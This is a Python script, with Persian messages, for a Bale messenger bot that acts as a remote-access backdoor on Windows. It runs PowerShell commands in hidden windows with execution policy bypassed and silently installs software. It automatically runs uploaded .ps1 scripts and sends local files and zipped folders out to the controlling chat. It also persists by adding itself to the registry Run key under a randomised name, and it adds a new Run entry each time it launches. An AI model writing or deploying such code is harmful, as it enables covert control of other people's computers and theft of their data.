import requests
import subprocess
import winreg
import uuid
import os
import time
import json
import zipfile
from urllib.parse import urljoin

# Initial settings
TOKEN = ('BOT_Token')  # Bot token
API_URL = f'https://tapi.bale.ai/bot{TOKEN}/'
DOWNLOAD_DIR = os.path.join(os.path.expanduser('~'), 'bot_downloads')  # Default directory
ADMIN_CHAT_IDS = {123457890}  # Admin chat IDs (replace with your own)
is_system_command = False
is_waiting_for_dir = False
is_waiting_for_zip_choice = False
current_chat_id = None
current_directory = os.getcwd()
pending_download_dir = None
pending_zip_choice = None

# Create default directory
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

def validate_token():
    if TOKEN == 'Your_Token_Bot':
        raise ValueError("لطفاً توکن ربات را در متغیر محیطی BOT_TOKEN تنظیم کنید.")

def send_message(chat_id, text, reply_markup=None):
    try:
        url = urljoin(API_URL, 'sendMessage')
        payload = {'chat_id': chat_id, 'text': text}
        if reply_markup:
            payload['reply_markup'] = reply_markup
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"خطا در ارسال پیام: ⛔ {e}")
        return None

def send_file(chat_id, file_path):
    try:
        url = urljoin(API_URL, 'sendDocument')
        with open(file_path, 'rb') as file:
            files = {'document': file}
            payload = {'chat_id': chat_id}
            response = requests.post(url, data=payload, files=files, timeout=10)
            response.raise_for_status()
            return response.json()
    except (requests.RequestException, FileNotFoundError) as e:
        print(f"خطا در ارسال فایل: ⛔ {e}")
        send_message(chat_id, f"خطا در ارسال فایل: {e}")
        return None

def zip_folder(folder_path, output_path):
    try:
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
        return output_path
    except Exception as e:
        print(f"خطا در فشرده‌سازی: ⛔ {e}")
        return None

def unzip_file(zip_path, extract_dir):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except Exception as e:
        print(f"خطا در استخراج فایل زیپ: ⛔ {e}")
        return False

def download_file(file_id, file_name, target_dir, unzip=False):
    try:
        url = urljoin(API_URL, 'getFile')
        response = requests.get(url, params={'file_id': file_id}, timeout=10)
        response.raise_for_status()
        file_info = response.json()
        
        if not file_info.get('ok'):
            return None
        
        file_path = file_info['result']['file_path']
        file_url = f'https://tapi.bale.ai/file/bot{TOKEN}/{file_path}'
        safe_file_name = "".join(c for c in file_name if c.isalnum() or c in ('.', '_')).rstrip()
        download_path = os.path.join(target_dir, safe_file_name)
        
        if not os.access(target_dir, os.W_OK):
            return None
        
        response = requests.get(file_url, timeout=10)
        response.raise_for_status()
        with open(download_path, 'wb') as f:
            f.write(response.content)
        
        if unzip and download_path.endswith('.zip'):
            if unzip_file(download_path, target_dir):
                os.remove(download_path)
                return f"فایل زیپ با موفقیت استخراج شد در: {target_dir}"
            else:
                return f"خطا در استخراج فایل زیپ"
        return download_path
    except (requests.RequestException, IOError, OSError) as e:
        print(f"خطا در دانلود فایل: ⛔ {e}")
        return None

def run_powershell_command_hidden(command, is_admin=False):
    global current_directory
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        if command.startswith('cd '):
            path = command[3:].strip()
            if path == '':
                current_directory = os.path.expanduser('~')
                return f"تغییر دایرکتوری به: {current_directory}"
            new_directory = os.path.abspath(os.path.join(current_directory, path))
            if os.path.isdir(new_directory):
                current_directory = new_directory
                return f"تغییر دایرکتوری به: {current_directory}"
            return "خطا: دایرکتوری یافت نشد 🚫"

        # Install programs with Chocolatey or Winget
        if command.startswith('install '):
            program = command[8:].strip()
            # Try Winget first
            winget_command = f"winget install --id {program} -e --silent --accept-package-agreements --accept-source-agreements"
            result = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', winget_command],
                capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
            )
            if result.returncode == 0:
                return f"برنامه {program} با winget نصب شد ✅"
            # Try Chocolatey if Winget fails
            choco_command = f"choco install {program} -y"
            result = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', choco_command],
                capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
            )
            if result.returncode == 0:
                return f"برنامه {program} با Chocolatey نصب شد ✅"
            return f"خطا در نصب برنامه: ⛔ {result.stderr.strip()}"

        # No restrictions on commands for admins
        if not is_admin:
            return "خطا: فقط ادمین‌ها می‌توانند دستورات را اجرا کنند 🚫"

        combined_command = f"$ConfirmPreference='None'; Set-Location -Path '{current_directory}'; {command}"
        result = subprocess.run(
            ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', combined_command],
            capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
        )
        if result.returncode == 0:
            return result.stdout.strip() or "دستور اجرا شد اما خروجی نداشت. ✅"
        else:
            return f"خطا در اجرای دستور: ⛔ {result.stderr.strip()}"
    except Exception as e:
        return f"خطای غیرمنتظره: ⛔ {e}"

def run_powershell_script(file_path, is_admin=False):
    try:
        if not file_path.endswith('.ps1'):
            return "خطا: فقط فایل‌های .ps1 مجاز هستند. 🚫"
        
        if not is_admin:
            return "خطا: فقط ادمین‌ها می‌توانند اسکریپت‌ها را اجرا کنند. 🚫"

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        command = f"$ConfirmPreference='None'; Set-Location -Path '{current_directory}'; & '{file_path}'"
        result = subprocess.run(
            ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', command],
            capture_output=True, text=True, encoding='utf-8', startupinfo=startupinfo
        )
        if result.returncode == 0:
            return result.stdout.strip() or "اسکریپت اجرا شد اما خروجی نداشت. ✅"
        else:
            return f"خطا در اجرای اسکریپت: ⛔ {result.stderr.strip()}"
    except Exception as e:
        return f"خطای غیرمنتظره: ⛔ {e}"

def generate_random_registry_key_name():
    return f"BotStartup_{str(uuid.uuid4())[:8]}"

def add_to_registry_on_startup(program_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as registry_key:
            registry_key_name = generate_random_registry_key_name()
            winreg.SetValueEx(registry_key, registry_key_name, 0, winreg.REG_SZ, program_path)
            print(f"برنامه با موفقیت به رجیستری با نام '{registry_key_name}' اضافه شد. ✅")
            return registry_key_name
    except Exception as e:
        print(f"خطا در اضافه کردن به رجیستری: ⛔ {e}")
        return None

def check_and_add_to_startup():
    program_path = os.path.abspath(__file__)
    key_name = generate_random_registry_key_name()
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_READ) as registry_key:
            try:
                value, _ = winreg.QueryValueEx(registry_key, key_name)
                if value == program_path:
                    return
            except FileNotFoundError:
                pass
        add_to_registry_on_startup(program_path)
    except Exception as e:
        print(f"خطا در بررسی رجیستری: ⛔ {e}")

def handle_update(update):
    global is_system_command, is_waiting_for_dir, is_waiting_for_zip_choice, current_chat_id, pending_download_dir, pending_zip_choice
    message = update.get('message')
    if not message:
        return

    current_chat_id = message['chat']['id']
    text = message.get('text')
    document = message.get('document')
    is_admin = current_chat_id in ADMIN_CHAT_IDS

    if not is_admin:
        send_message(current_chat_id, "خطا: فقط ادمین‌ها می‌توانند از این ربات استفاده کنند 🚫")
        return

    default_keyboard = {
        'keyboard': [
            [{'text': 'اجرای دستورات پاورشل 👨‍💻'}],
            [{'text': 'ارسال فایل 📤'}],
            [{'text': 'دریافت فایل 📥'}],
            [{'text': 'ارسال پوشه (فشرده) 📁'}]
        ],
        'resize_keyboard': True,
        'one_time_keyboard': True
    }

    zip_choice_keyboard = {
        'keyboard': [
            [{'text': 'فشرده (ZIP) 📦'}],
            [{'text': 'بدون فشرده‌سازی 📂'}],
            [{'text': 'پایان عملیات 🔚'}]
        ],
        'resize_keyboard': True,
        'one_time_keyboard': True
    }

    if text == '/start':
        send_message(current_chat_id, "سلام! به ربات کنترل پاورشل خوش اومدی! 😎")
        send_message(current_chat_id, "یکی از گزینه‌های زیر رو انتخاب کن: 👇", reply_markup=default_keyboard)

    elif text == 'اجرای دستورات پاورشل 👨‍💻':
        send_message(current_chat_id, "دستور پاورشل خودت رو وارد کن (همه دستورات برای ادمین مجاز هستند)")
        is_system_command = True
        is_waiting_for_dir = False
        is_waiting_for_zip_choice = False

    elif text == 'دریافت فایل 📥':
        send_message(current_chat_id, "مسیر فایل رو توی سیستم وارد کن (مثل: C:\\file.txt).")
        is_system_command = False
        is_waiting_for_dir = False
        is_waiting_for_zip_choice = False

    elif text == 'ارسال فایل 📤':
        send_message(current_chat_id, "مسیر دایرکتوری مقصد رو وارد کن (مثل: C:\\Users\\YourName\\Downloads).")
        is_system_command = False
        is_waiting_for_dir = True
        is_waiting_for_zip_choice = False

    elif text == 'ارسال پوشه (فشرده) 📁':
        send_message(current_chat_id, "مسیر پوشه رو وارد کن (مثل: C:\\Users\\YourName\\MyFolder).")
        is_system_command = False
        is_waiting_for_dir = True
        is_waiting_for_zip_choice = False
        pending_zip_choice = True

    elif text == 'فشرده (ZIP) 📦':
        if is_waiting_for_zip_choice:
            pending_zip_choice = True
            send_message(current_chat_id, "حالا فایل یا پوشه رو آپلود کن.")
            is_waiting_for_zip_choice = False

    elif text == 'بدون فشرده‌سازی 📂':
        if is_waiting_for_zip_choice:
            pending_zip_choice = False
            send_message(current_chat_id, "حالا فایل یا پوشه رو آپلود کن.")
            is_waiting_for_zip_choice = False

    elif text == 'پایان عملیات 🔚':
        send_message(current_chat_id, "عملیات تموم شد! 🔚")
        is_system_command = False
        is_waiting_for_dir = False
        is_waiting_for_zip_choice = False
        pending_download_dir = None
        pending_zip_choice = None
        send_message(current_chat_id, "برای ادامه، یکی از گزینه‌ها رو انتخاب کن: 👇", reply_markup=default_keyboard)

    else:
        if is_system_command:
            output = run_powershell_command_hidden(text, is_admin)
            send_message(current_chat_id, f"نتیجه اجرای دستور:\n{output}")
            send_message(current_chat_id, "برای تموم کردن عملیات، 'پایان عملیات' رو بزن.", reply_markup={
                'keyboard': [[{'text': 'پایان عملیات 🔚'}]],
                'resize_keyboard': True,
                'one_time_keyboard': True
            })
        elif is_waiting_for_dir and not document:
            target_dir = text.strip()
            if pending_zip_choice and not os.path.isdir(target_dir):
                send_message(current_chat_id, "خطا: مسیر باید یک پوشه باشد برای ارسال فشرده 📁")
            elif os.path.exists(target_dir) and os.access(target_dir, os.W_OK):
                pending_download_dir = target_dir
                if pending_zip_choice:
                    temp_zip = os.path.join(os.path.dirname(target_dir), f"{os.path.basename(target_dir)}.zip")
                    zipped = zip_folder(target_dir, temp_zip)
                    if zipped:
                        send_file(current_chat_id, zipped)
                        send_message(current_chat_id, f"پوشه فشرده با موفقیت ارسال شد 📁")
                        os.remove(temp_zip)
                    else:
                        send_message(current_chat_id, "خطا در فشرده‌سازی پوشه 🚫")
                    pending_download_dir = None
                    is_waiting_for_dir = False
                    pending_zip_choice = None
                else:
                    send_message(current_chat_id, "آیا فایل/پوشه را فشرده دریافت کنم؟", reply_markup=zip_choice_keyboard)
                    is_waiting_for_dir = False
                    is_waiting_for_zip_choice = True
            else:
                send_message(current_chat_id, "خطا: مسیر نامعتبره یا دسترسی نوشتن نداری. 🚫\nیه مسیر دیگه وارد کن.")
        elif document:
            file_id = document.get('file_id')
            file_name = document.get('file_name', 'unknown_file')
            target_dir = pending_download_dir if pending_download_dir else DOWNLOAD_DIR
            unzip = pending_zip_choice if pending_zip_choice is not None else False
            downloaded_path = download_file(file_id, file_name, target_dir, unzip)
            if downloaded_path:
                if file_name.endswith('.ps1'):
                    send_message(current_chat_id, "فایل پاورشل دریافت شد. در حال اجرا... 🚀")
                    output = run_powershell_script(downloaded_path, is_admin)
                    send_message(current_chat_id, f"نتیجه اجرای اسکریپت:\n{output}")
                else:
                    send_message(current_chat_id, f"فایل با موفقیت دانلود شد 📥: {downloaded_path}")
                pending_download_dir = None
                is_waiting_for_dir = False
                is_waiting_for_zip_choice = False
                pending_zip_choice = None
            else:
                send_message(current_chat_id, "خطا در دانلود فایل. 🚫")
            send_message(current_chat_id, "برای ادامه، یکی از گزینه‌ها رو انتخاب کن: 👇", reply_markup=default_keyboard)
        else:
            file_path = text.strip()
            if os.path.isfile(file_path):
                send_file(current_chat_id, file_path)
                send_message(current_chat_id, "فایل با موفقیت ارسال شد. 📤")
            else:
                send_message(current_chat_id, "خطا: فایل پیدا نشد. 🚫")
            send_message(current_chat_id, "برای ادامه، یکی از گزینه‌ها رو انتخاب کن: 👇", reply_markup=default_keyboard)

def get_updates(offset=None):
    try:
        url = urljoin(API_URL, 'getUpdates')
        params = {'timeout': 30, 'offset': offset}
        response = requests.get(url, params=params, timeout=40)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"خطا در دریافت آپدیت‌ها: ⛔ {e}")
        return {'result': []}

def main():
    validate_token()
    check_and_add_to_startup()
    last_update_id = None
    while True:
        updates = get_updates(last_update_id)
        for update in updates.get('result', []):
            handle_update(update)
            last_update_id = update['update_id'] + 1
        time.sleep(1)  # Prevent excessive requests

if __name__ == '__main__':
    main()
